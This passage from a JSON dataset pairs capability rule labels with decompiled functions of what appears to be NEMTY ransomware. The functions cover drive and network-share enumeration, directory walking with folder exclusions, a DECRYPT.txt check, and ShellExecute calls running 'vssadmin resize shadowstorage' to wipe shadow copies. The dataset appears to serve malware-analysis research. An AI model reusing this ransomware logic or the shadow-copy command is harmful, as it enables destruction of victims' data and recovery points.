in_stack_ffffffa4);\n    if (iVar1 != 0) {\n        puVar2 = &fcn.00401423::var_3ch;\n        iVar1 = fcn.004037a7();\n        if (2 < iVar1) {\n            var_10h = 0;\n            var_20h._0_2_ = 0;\n            var_ch = 7;\n            fcn.00404556();\n            fcn.00404786(puVar2, 0);\n            fcn.004044ff();\n            fcn.00403887();\n            fcn.00403aec(1);\n            in_stack_ffffffa4 = puVar2;\n        }\n    }\n    fcn.00403aec(1);\n    fcn.004083f8(in_stack_ffffffa4);\n    return;\n}\n",
        "token_count": 556
    },
    "004014d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014d5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint32_t var_8h;\n    uint dwBytes;\n    \n    var_8h = 0xffffffff;\n    dwBytes = 0x4000;\n    iVar1 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(2, 0, 0, arg_8h, &var_ch);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes);\n        while( true ) {\n            uVar3 = 0;\n            fcn.0040a370(iVar1, 0, dwBytes);\n            iVar2 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(var_ch, &var_8h, iVar1, &dwBytes);\n            if (iVar2 != 0) break;\n            iVar2 = iVar1;\n            if (var_8h != 0) {\n                do {\n                    fcn.00401423(iVar2);\n                    if ((*(iVar2 + 0xc) & 2) == 2) {\n                        fcn.004014d5(iVar2);\n                    }\n                    uVar3 = uVar3 + 1;\n                    iVar2 = iVar2 + 0x20;\n                } while (uVar3 < var_8h);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar1);\n        (*_sym.imp.MPR.dll_WNetCloseEnum)(var_ch);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004035db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035db(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U < 2) {\n        iVar2 = fcn.00408332(\"string too long\");\n    }\n    cVar1 = fcn.00403c7d(0);\n    if (cVar1 != '\\0') {\n        puVar3 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar3 = *unaff_ESI;\n        }\n        *(puVar3 + unaff_ESI[4]) = arg_8h;\n        unaff_ESI[4] = iVar2 + 1;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + iVar2 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "004036e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004036f9)\n\nint32_t __cdecl fcn.004036e4(uint arg_8h)\n\n{\n    char **in_EAX;\n    int32_t iVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    \n    if (in_EAX[4] != NULL) {\n        ppcVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar3 = *in_EAX;\n        }\n        ppcVar3 = ppcVar3 + in_EAX[4] + -1;\n        while( true ) {\n            if ((*ppcVar3 == arg_8h) && (iVar1 = fcn.00408d61(ppcVar3, &arg_8h, 1),  iVar1 == 0)) {\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                return ppcVar3 - in_EAX;\n            }\n            ppcVar2 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                ppcVar2 = *in_EAX;\n            }\n            if (ppcVar3 == ppcVar2) break;\n            ppcVar3 = ppcVar3 + -1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 303
    },
    "004037a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.004037a7(void)\n\n{\n    uint *puVar1;\n    uint16_t **ppuVar2;\n    uint16_t **ppuVar3;\n    uint16_t **unaff_ESI;\n    int32_t iVar4;\n    uint var_4h;\n    \n    var_4h = 0x5c;\n    if (unaff_ESI[4] == NULL) {\n        return -1;\n    }\n    ppuVar3 = unaff_ESI;\n    if (0x7 < unaff_ESI[5]) {\n        ppuVar3 = *unaff_ESI;\n    }\n    ppuVar3 = ppuVar3 + (unaff_ESI[4] + -1) * 2;\n    do {\n        if (*ppuVar3 == 0x5c) {\n            iVar4 = 1;\n            puVar1 = &var_4h;\n            ppuVar2 = ppuVar3;\n            do {\n                if (*ppuVar2 != *puVar1) {\n                    iVar4 = (-(*ppuVar2 < *puVar1) & 0xfffffffe) + 1;\n                    goto code_r0x004037f6;\n                }\n                ppuVar2 = ppuVar2 + 2;\n                puVar1 = puVar1 + 2;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            iVar4 = 0;\ncode_r0x004037f6:\n            if (iVar4 == 0) {\n                if (0x7 < unaff_ESI[5]) {\n                    unaff_ESI = *unaff_ESI;\n                }\n                return ppuVar3 - unaff_ESI >> 1;\n            }\n        }\n        ppuVar2 = unaff_ESI;\n        if (0x7 < unaff_ESI[5]) {\n            ppuVar2 = *unaff_ESI;\n        }\n        if (ppuVar3 == ppuVar2) {\n            return -1;\n        }\n        ppuVar3 = ppuVar3 + -2;\n    } while( true );\n}\n",
        "token_count": 471
    },
    "00403c49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c49(int32_t arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t in_ECX;\n    char in_DL;\n    \n    if (arg_8h == 1) {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        *(in_EAX + in_ECX) = in_DL;\n    }\n    else {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        fcn.0040a370(in_EAX + in_ECX, in_DL, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004044ff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004044ff(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U < 2) {\n        iVar2 = fcn.00408332(\"string too long\");\n    }\n    cVar1 = fcn.00403dd0(0);\n    if (cVar1 != '\\0') {\n        puVar3 = unaff_ESI;\n        if (7 < unaff_ESI[5]) {\n            puVar3 = *unaff_ESI;\n        }\n        *(puVar3 + unaff_ESI[4] * 2) = 0x5c;\n        unaff_ESI[4] = iVar2 + 1;\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar2 + 1) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00404ab1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404ab1(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint in_stack_ffffff48;\n    uint var_b0h;\n    uint32_t var_ach;\n    uint32_t lpTotalNumberOfBytes;\n    int32_t var_a4h;\n    uint32_t lpFreeBytesAvailableToCaller;\n    int32_t var_9ch;\n    int32_t var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint *var_3ch;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    var_98h = 0;\n    do {\n        if ((uVar1 >> (var_98h & 0x1f) & 1) != 0) {\n            var_2ch = 0;\n            var_ach = var_ach & 0xffffff00 | var_98h + 0x41;\n            var_28h = 0xf;\n            var_3ch = var_3ch & 0xffffff00;\n            fcn.004050e4(var_ach);\n            var_10h = 0;\n            var_ch = 0xf;\n            var_20h = var_20h & 0xffffff00;\n            fcn.0040a2c0(0x413ab8);\n            fcn.004044b2();\n            fcn.0040458b(&var_3ch, 0);\n            fcn.0040a2c0(0x413ab8);\n            fcn.0040461f(0x413ab8);\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            var_94h = (*_sym.imp.KERNEL32.dll_GetDriveTypeA)(puVar3);\n            fcn.0040135c(1);\n            if (var_94h == 2) {\n                pcVar5 = \": /maxsize=401MB\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_90h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                pcVar5 = \": /maxsize=unbounded\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_74h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040a2c0(0x413ab8);\n                fcn.0040461f(0x413ab8);\n                fcn.00403832();\n                fcn.00403597(\"REMOVABLE\");\n                fcn.00403832();\n                fcn.0040135c(1);\n            }\n            if (var_94h == 3) {\n                pcVar5 = \": /maxsize=401MB\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_74h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                pcVar5 = \": /maxsize=unbounded\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_74h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040a2c0(0x413ab8);\n                fcn.0040461f(0x413ab8);\n                fcn.00403832();\n                fcn.00403597(\"FIXED\");\n                fcn.00403832();\n                fcn.0040135c(1);\n            }\n            if (var_94h == 4) {\n                pcVar5 = \": /maxsize=401MB\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_74h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                pcVar5 = \": /maxsize=unbounded\";\n                puVar3 = &var_3ch;\n                pcVar4 = \": /on=\";\n                uVar2 = fcn.0040525e(\" /c vssadmin resize shadowstorage /for=\");\n                fcn.00404427(uVar2, pcVar4);\n                uVar2 = fcn.004043c4(&var_74h, puVar3);\n                puVar3 = fcn.00404427(uVar2, pcVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x413b00, puVar3, 0, 0);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.0040a2c0(0x413ab8);\n                fcn.0040461f(0x413ab8);\n                fcn.00403832();\n                fcn.00403597(\"NETWORK\");\n                fcn.00403832();\n                fcn.0040135c(1);\n            }\n            puVar3 = var_3ch;\n            if (var_28h < 0x10) {\n                puVar3 = &var_3ch;\n            }\n            (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceExA)\n                      (puVar3, &lpFreeBytesAvailableToCaller, &lpTotalNumberOfBytes, 0);\n            var_94h = lpTotalNumberOfBytes >> 0x1e | var_a4h << 2;\n            fcn.00405098();\n            var_94h = lpFreeBytesAvailableToCaller >> 0x1e | var_9ch << 2;\n            fcn.00405098();\n            var_94h = lpTotalNumberOfBytes - lpFreeBytesAvailableToCaller >> 0x1e |\n                      ((var_a4h - var_9ch) - (lpTotalNumberOfBytes < lpFreeBytesAvailableToCaller)) * 4;\n            fcn.00405098();\n            fcn.0040135c(1);\n        }\n        var_98h = var_98h + 1;\n    } while (var_98h < 0x1a);\n    fcn.004083f8(in_stack_ffffff48);\n    return;\n}\n",
        "token_count": 2353
    },
    "00406de1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406de1(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 1;\n    cVar1 = fcn.004040e4(arg_8h);\n    if (cVar1 == '\\0') {\n        uVar5 = in_ECX[4];\n        if (uVar5 < in_EAX) {\n            fcn.0040837f(\"invalid string position\");\n            uVar5 = extraout_ECX;\n        }\n        uVar2 = uVar5 - in_EAX;\n        if (uVar2 == 0) {\n            var_4h = uVar2;\n        }\n        if (-arg_ch - 1 <= uVar5 - var_4h) {\n            uVar2 = fcn.00408332(\"string too long\");\n        }\n        if (arg_ch < var_4h) {\n            puVar3 = in_ECX;\n            puVar4 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n                puVar4 = *in_ECX;\n            }\n            fcn.00408a00(puVar3 + arg_ch + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n        }\n        if ((arg_ch != 0) || (var_4h != 0)) {\n            iVar6 = (arg_ch - var_4h) + in_ECX[4];\n            cVar1 = fcn.00403c7d(0);\n            if (cVar1 != '\\0') {\n                if (var_4h < arg_ch) {\n                    puVar3 = in_ECX;\n                    puVar4 = in_ECX;\n                    if (0xf < in_ECX[5]) {\n                        puVar3 = *in_ECX;\n                        puVar4 = *in_ECX;\n                    }\n                    fcn.00408a00(puVar3 + arg_ch + in_EAX, puVar4 + var_4h + in_EAX, uVar2 - var_4h);\n                }\n                puVar4 = in_ECX;\n                if (0xf < in_ECX[5]) {\n                    puVar4 = *in_ECX;\n                }\n                fcn.00408410(puVar4 + in_EAX, arg_8h, arg_ch);\n                in_ECX[4] = iVar6;\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                *(in_ECX + iVar6) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar4 = *in_ECX;\n        }\n        fcn.00406b59(1, in_ECX, arg_8h - puVar4, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 736
    },
    "004016c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004016c3(uint arg_8h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *arg_8h_00;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *arg_8h_01;\n    uint noname_1;\n    uchar *arg_8h_02;\n    uchar *puVar7;\n    uint uVar8;\n    uchar *arg_8h_03;\n    uint in_stack_fffffc6c;\n    uint in_stack_fffffc70;\n    uint in_stack_fffffc74;\n    uchar *in_stack_fffffc78;\n    uint in_stack_fffffc7c;\n    char16_t *in_stack_fffffc80;\n    char *in_stack_fffffc84;\n    char16_t *in_stack_fffffc88;\n    char *in_stack_fffffc8c;\n    uchar *in_stack_fffffc90;\n    uchar *in_stack_fffffc94;\n    char16_t *in_stack_fffffc98;\n    char *noname_2;\n    char16_t *noname_8;\n    uint32_t noname_4;\n    uint uVar9;\n    uint noname_10;\n    uint arg_34h;\n    uint *arg_8h_04;\n    uint uStack836;\n    uint32_t uVar10;\n    uchar *arg_8h_05;\n    uchar *puVar11;\n    uint uStack812;\n    uint *arg_8h_06;\n    uchar auStack788 [4];\n    uint32_t uStack784;\n    uint uStack768;\n    uint uStack764;\n    ushort uStack760;\n    uchar auStack756 [12];\n    uint uStack744;\n    uint uStack740;\n    uchar auStack676 [20];\n    uint8_t auStack656 [16];\n    uchar auStack640 [4];\n    uchar auStack636 [12];\n    uchar auStack624 [4];\n    uchar auStack620 [8];\n    uchar auStack612 [4];\n    uchar auStack608 [4];\n    uchar auStack604 [592];\n    uint32_t uStack12;\n    \n    uStack12 = *0x416084 ^ &stack0xfffffcec;\n    arg_8h_06 = &fcn.004016c3::arg_8h;\n    uStack784 = 0;\n    fcn.00403753(arg_8h_06);\n    uStack812 = 0x401707;\n    fcn.00403779(0x4133a4);\n    uStack812 = 7;\n    uStack784 = uStack784 & 0xffff0000;\n    arg_8h_04 = &fcn.004016c3::arg_8h;\n    uStack764 = 7;\n    uStack768 = 0;\n    fcn.00403753(arg_8h_04);\n    fcn.0040292d(arg_8h_04);\n    uStack760 = 0;\n    uStack740 = 7;\n    uStack744 = 0;\n    fcn.00404556();\n    fcn.00404786(&stack0xfffffd5c, 0);\n    puVar11 = NULL;\n    arg_8h_05 = &stack0xfffffd70;\n    fcn.00404786(arg_8h_05, 0);\n    fcn.00403a0a();\n    uVar10 = 1;\n    uStack836 = 0x40178f;\n    fcn.00403aec(1);\n    uStack836 = &stack0xfffffd80;\n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n    if (iVar4 != -1) {\n        do {\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n            puVar7 = &stack0xfffffda4;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n            if ((((((iVar4 == 0) || (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)) ||\n                  (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)) ||\n                 (((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                   (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)) ||\n                  ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                   ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                    (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)))))))) ||\n                ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                 ((((((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                      (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)) ||\n                     (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)) ||\n                    ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                     (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)))) ||\n                   ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                    ((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 ||\n                     (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)))))) ||\n                  (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)))))) ||\n               (((iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0 || (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)\n                 ) || (iVar4 = (*pcVar2)(&stack0xfffffd9c),  iVar4 == 0)))) {\ncode_r0x00401a2c:\n                bVar1 = true;\n            }\n            else {\n                fcn.00403779(&stack0xfffffd9c);\n                uStack836 = uStack836 | 1;\n                in_stack_fffffc8c = \"Common Files\";\n                in_stack_fffffc88 = 0x4019c8;\n                fcn.00403597(\"Common Files\");\n                uVar8 = 0x4019d7;\n                fcn.00407fef(&stack0xfffffcdc);\n                in_stack_fffffc6c = 0x4019dd;\n                iVar4 = fcn.004081f8(in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, in_stack_fffffc7c, \n                                     in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c);\n                if (iVar4 != 0) goto code_r0x00401a2c;\n                fcn.00403779(&stack0xfffffd94);\n                in_stack_fffffc84 = \"TorDir\";\n                in_stack_fffffc80 = 0x401a09;\n                fcn.00403597(\"TorDir\");\n                fcn.00407fef(&stack0xfffffcf0);\n                iVar4 = fcn.004081f8(uVar8, in_stack_fffffc6c, in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, \n                                     in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84);\n                if (iVar4 != 0) goto code_r0x00401a2c;\n                bVar1 = false;\n            }\n            if ((uVar10 & 2) != 0) {\n                uVar10 = uVar10 & 0xfffffffd;\n                fcn.00403aec(1);\n            }\n            if ((uVar10 & 1) != 0) {\n                uVar10 = uVar10 & 0xfffffffe;\n                fcn.00403aec(1);\n            }\n            if (!bVar1) {\n                if ((auStack656[0] & 0x10) == 0) {\n                    fcn.00403779(&stack0xfffffd9c);\n                    fcn.00407fef(&stack0xfffffd18);\n                    fcn.00403aec(1);\n                    uVar9 = 0x2e;\n                    fcn.004036e4(0x2e);\n                    fcn.00403637();\n                    puVar7 = &stack0xfffffd90;\n                    fcn.00403779(puVar7);\n                    fcn.00407fef(&stack0xfffffd0c);\n                    uVar8 = 1;\n                    fcn.00403aec(1);\n                    noname_2 = 0x2d;\n                    fcn.004036e4(0x2d);\n                    fcn.00403637();\n                    fcn.00404324(&stack0xfffffd84);\n                    fcn.00403a0a();\n                    in_stack_fffffc94 = 0x1;\n                    fcn.00403aec(1);\n                    in_stack_fffffc90 = 0x1c;\n                    uVar6 = 0;\n                    noname_4 = puVar7 & 0xffffff;\n                    if ((*0x417b64 - *0x417b60) / 0x1c != 0) {\n                        iVar4 = 0;\n                        do {\n                            arg_8h_00 = iVar4 + *0x417b60;\n                            if (0xf < arg_8h_00[5]) {\n                                arg_8h_00 = *arg_8h_00;\n                            }\n                            iVar5 = fcn.004039c5(arg_8h_00);\n                            if (iVar5 == 0) {\n                                arg_8h_05 = CONCAT13(1, arg_8h_05);\n                            }\n                            uVar6 = uVar6 + 1;\n                            iVar4 = iVar4 + 0x1c;\n                        } while (uVar6 < (*0x417b64 - *0x417b60) / 0x1c);\n                    }\n                    cVar3 = fcn.004049c9(\"DECRYPT.txt\");\n                    if (cVar3 == '\\0') {\n                        noname_2 = \"NEMTY\";\n                        in_stack_fffffc94 = 0x401d18;\n                        fcn.00403597(\"NEMTY\");\n                        in_stack_fffffc78 = &stack0xfffffce8;\n                        fcn.00403573(in_stack_fffffc78);\n                        in_stack_fffffc74 = 0x401d2c;\n                        iVar4 = fcn.004081f8(in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84\n                                             , in_stack_fffffc88, in_stack_fffffc8c, in_stack_fffffc90, \n                                             in_stack_fffffc94);\n                        if ((iVar4 == 0) && (uStack836._3_1_ == '\\0')) {\n                            in_stack_fffffc90 = puVar11;\n                            if (arg_8h_06 < 0x8) {\n                                in_stack_fffffc90 = &stack0xfffffcc8;\n                            }\n                            fcn.00403779(in_stack_fffffc90);\n                            in_stack_fffffc8c = 0x401d58;\n                            fcn.00402af7(in_stack_fffffc90, in_stack_fffffc94, noname_2, uVar8, noname_4, uVar9);\n                        }\n                    }\n                    fcn.0040135c(1);\n                    fcn.0040135c(1);\n                    in_stack_fffffc98 = noname_2;\n                }\n                else {\n                    fcn.00404324(&stack0xfffffd9c);\n                    fcn.004044ff();\n                    fcn.004044e5();\n                    fcn.00403a0a();\n                    arg_34h = 1;\n                    fcn.00403aec(1);\n                    noname_10 = 1;\n                    uVar9 = 0x401ac0;\n                    fcn.00403aec(1);\n                    in_stack_fffffc88 = L\"Program Files\";\n                    in_stack_fffffc84 = 0x401ad0;\n                    fcn.00403779(L\"Program Files\");\n                    arg_8h_03 = &stack0xfffffcbc;\n                    fcn.00403753(arg_8h_03);\n                    uVar8 = 0x401ae4;\n                    iVar4 = fcn.00408231(arg_8h_03, in_stack_fffffc6c, in_stack_fffffc70, in_stack_fffffc74, \n                                         in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84, \n                                         in_stack_fffffc88, in_stack_fffffc8c, in_stack_fffffc90, in_stack_fffffc94, \n                                         in_stack_fffffc98);\n                    in_stack_fffffc80 = L\"Program Files\";\n                    if (iVar4 == 0) {\n                        in_stack_fffffc7c = 0x401b9d;\n                        fcn.00403779(L\"Program Files\");\n                        puVar7 = &stack0xfffffcb4;\n                        fcn.00403753(puVar7);\n                        iVar4 = fcn.00408231(puVar7, uVar8, arg_8h_03, in_stack_fffffc6c, in_stack_fffffc70, \n                                             in_stack_fffffc74, in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80\n                                             , in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c, \n                                             in_stack_fffffc90);\n                        if (iVar4 != 0) goto code_r0x00401d73;\n                    }\n                    else {\n                        in_stack_fffffc7c = 0x401afa;\n                        fcn.00403779(L\"Program Files\");\n                        arg_8h_02 = &stack0xfffffcb4;\n                        fcn.00403753(arg_8h_02);\n                        noname_1 = 0x401b0e;\n                        iVar4 = fcn.00408231(arg_8h_02, uVar8, arg_8h_03, in_stack_fffffc6c, in_stack_fffffc70, \n                                             in_stack_fffffc74, in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80\n                                             , in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c, \n                                             in_stack_fffffc90);\n                        if (iVar4 != 0) {\n                            in_stack_fffffc78 = 0x41355c;\n                            in_stack_fffffc74 = 0x401b24;\n                            fcn.00403779(0x41355c);\n                            arg_8h_01 = &stack0xfffffcac;\n                            fcn.00403753(arg_8h_01);\n                            iVar4 = fcn.00408231(arg_8h_01, noname_1, arg_8h_02, uVar8, arg_8h_03, in_stack_fffffc6c, \n                                                 in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, \n                                                 in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84, \n                                                 in_stack_fffffc88);\n                            if (iVar4 != 0) goto code_r0x00401bbc;\n                        }\n                        noname_8 = L\"Compac\";\n                        uVar8 = 0x401b4e;\n                        fcn.00403779(L\"Compac\");\n                        in_stack_fffffc80 = &stack0xfffffcd4;\n                        fcn.00403753(in_stack_fffffc80);\n                        in_stack_fffffc7c = 0x401b62;\n                        iVar4 = fcn.00408231(in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c\n                                             , in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98, uVar8, noname_8\n                                             , uVar9, noname_10, arg_34h, puVar7);\n                        if (iVar4 == 